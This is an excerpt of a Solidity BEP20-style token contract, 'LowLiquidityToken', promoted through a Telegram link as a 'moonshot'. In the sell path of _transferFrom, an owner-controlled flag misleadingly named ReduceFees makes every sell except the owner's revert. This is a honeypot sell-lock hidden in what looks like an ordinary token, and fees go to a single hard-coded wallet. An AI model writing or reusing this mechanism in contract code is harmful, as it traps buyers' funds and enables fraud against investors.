...
// https://t.me/lowliquiditytoken
// Low starting liq and low taxes, moonshot mission 
...
contract LOWLIQUIDITYTOKEN is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7; 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "LowLiquidityToken";
    string constant _symbol = "LLC";
    ...
    address public autoLiquidityReceiver=0x696422C5091f22E341132763fd2CcbD667FBA8BA;
    address public marketingFeeReceiver=0x696422C5091f22E341132763fd2CcbD667FBA8BA;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!ReduceFees || sender==owner), "distribution enabled");
